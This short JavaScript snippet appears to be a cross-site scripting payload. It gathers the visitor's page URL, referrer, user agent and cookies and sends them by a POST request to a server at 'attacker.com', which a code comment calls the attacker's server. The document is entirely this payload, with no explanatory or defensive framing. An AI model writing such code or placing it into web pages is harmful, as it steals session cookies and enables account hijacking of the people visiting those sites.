// Collect user info
var info = {
    url: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    cookies: document.cookie
};

// Send data to attacker's server
fetch('https://attacker.com/log.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(info)
});
